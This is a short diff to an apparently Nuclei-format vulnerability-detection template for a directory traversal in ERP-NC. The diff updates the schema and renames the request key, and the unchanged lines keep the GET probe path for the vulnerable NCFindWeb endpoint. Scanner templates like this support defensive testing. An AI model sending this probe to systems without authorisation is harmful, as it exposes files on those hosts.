@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: erp-nc-directory-traversal
 info:
   name: ERP-NC directory traversal
@@ -5,7 +6,7 @@ info:
   severity: high
   reference: https://mp.weixin.qq.com/s/wH5luLISE_G381W2ssv93g
   tags: lfi,erp-nc
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/NCFindWeb?service=IPreAlertConfigService&filename="
